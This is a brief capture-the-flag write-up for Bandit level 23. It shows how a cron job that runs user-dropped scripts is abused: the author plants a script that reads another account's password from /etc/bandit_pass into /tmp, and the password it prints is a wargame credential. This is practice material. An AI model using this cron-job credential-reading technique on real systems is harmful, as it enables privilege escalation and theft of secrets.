# Level 23

## Explanation

this level requires us to create a shell-script.

## Solution
<pre>
bandit23@bandit:~$ cat  /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ cd /tmp
bandit23@bandit:/tmp$ mkdir lvl23
bandit23@bandit:/tmp$ cd lvl23
bandit23@bandit:/tmp/lvl23$ nano script.sh
bandit23@bandit:/tmp/lvl23$ cat script.sh
*#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mypass
bandit23@bandit:/tmp/lvl23$ chmod +x script.sh
bandit23@bandit:/tmp/lvl23$ cd ..
bandit23@bandit:/tmp$ touch mypass
bandit23@bandit:/tmp$ cd lvl23
bandit23@bandit:/tmp/lvl23$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/lvl23$ cd ..
bandit23@bandit:/tmp$ cat mypass
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
</pre>


<pre>
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mypass
</pre>
this script Reads bandit24's password and writes it to a file that i have asses to
